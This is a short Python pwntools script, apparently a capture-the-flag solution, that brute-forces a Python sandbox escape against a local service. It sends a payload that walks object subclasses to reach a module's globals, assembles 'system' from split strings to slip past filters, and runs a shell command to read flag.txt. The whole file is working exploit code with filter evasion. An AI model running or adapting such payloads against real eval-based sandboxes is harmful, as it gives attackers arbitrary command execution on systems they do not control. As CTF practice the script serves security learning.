# get all those classes and try all of them
from pwn import *

s = """().__class__.__base__.__subclasses__()[NUMBER].__init__.__globals__[''.join(['sy', 'stem'])]('cat flag.txt')"""
host = "127.0.0.1"
port = "9993"


def check_solution(s):
    try:
        r = remote(host, port)
        r.sendline(s)
        response = r.recvall()
        if b"ping" in response:
            return True
        return False
    except:
        return False


for i in range(0, 255):
    p = s.replace("NUMBER", str(i))
    # send p to the server and check if response contains 'ping'
    if check_solution(p):
        print(p)
        break
